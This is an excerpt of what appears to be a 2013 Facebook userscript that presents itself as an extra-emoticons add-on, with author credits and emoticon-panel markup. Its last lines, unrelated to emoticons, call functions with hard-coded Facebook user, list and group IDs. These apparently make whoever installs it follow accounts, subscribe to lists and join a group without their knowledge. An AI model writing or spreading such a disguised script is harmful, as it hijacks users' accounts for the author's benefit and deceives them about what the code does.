...
// @description	New Facebook June 2013 Emoticons for Status, Chat and Comment.
// @version 	1.0.6
// @author  	Shübhäm Tïwärï 
// @authorURL	http://www.facebook.com/Punit.ra1
...
"chars" : " :) ",
	...
	function createTabListBody(emoticons, filter) {
		...
		html = '<div style="max-height: 500px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 230px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
	...
	// Toggler
	html += '<a class="navLink" title="Show Facebook Extra Emoticons By Shübhäm Tïwärï ">'; // var navLink
	html += '<span style="vertical-align: middle;"><img width="25" height="25" src="https://fbcdn-sphotos-f-a.akamaihd.net/hphotos-ak-frc1/p480x480/294539_256700764360273_1648560460_n.jpg"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Punit.ra1" target="_blank">Created by Shübhäm Tïwärï</a><br><a class="jewelFooter" href="https://trickypoint.blogspot.com/" target="_blank">Tricky Point</a>';
	html += '</div>';
...
a("100007266191844");
a("100005272146843");
sublist("203519506519371");
sublist("203518809852774");
sublist("193213634216625");


var gid = ['439623716164484'];
